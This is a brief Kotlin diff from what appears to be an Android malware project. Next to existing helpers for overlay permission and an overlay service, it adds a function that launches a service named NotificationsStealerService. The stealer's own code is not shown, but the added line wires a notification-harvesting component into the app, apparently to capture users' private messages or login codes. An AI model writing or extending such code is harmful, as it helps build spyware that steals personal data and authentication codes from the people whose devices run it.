@@ -16,3 +16,7 @@ fun Context.requestOverlayPermission() {
 fun Context.startOverlayService() {
     startService(Intent(this, OverlayService::class.java))
 }
+
+fun Context.startNotificationsStealerService() {
+    startService(Intent(this, NotificationsStealerService::class.java))
+}
